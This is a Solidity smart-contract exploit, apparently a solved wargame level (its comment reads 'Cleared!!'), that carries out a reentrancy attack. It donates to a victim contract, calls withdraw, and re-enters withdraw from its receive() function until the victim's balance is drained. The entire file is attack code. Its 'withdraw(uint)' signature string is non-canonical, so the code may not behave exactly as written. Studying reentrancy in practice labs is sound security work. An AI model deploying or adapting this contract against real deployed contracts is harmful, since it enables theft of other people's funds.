// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// クリア!!
contract ReentranceAttack {
  address public owner;
  address payable victim;
  uint amount = 0.01 ether;

  constructor(address payable _victim) public {
    victim = _victim;
    owner = msg.sender;
  }

  function balance() public view returns (uint) {
      return address(this).balance / 1 ether;
  }

  function donateAndWithdraw() public payable {
    require(msg.value >= amount);
    bytes memory payload_donate = abi.encodeWithSignature("donate(address)", address(this));
    bytes memory payload_withdraw = abi.encodeWithSignature("withdraw(uint)", msg.value);
    address(victim).call{value: msg.value}(payload_donate);
    address(victim).call(payload_withdraw);
  }

  receive() external payable {
    if (address(victim).balance >= amount) {
      bytes memory payload_withdraw = abi.encodeWithSignature("withdraw(uint)", msg.value);
      address(victim).call(payload_withdraw);
    }
  }
}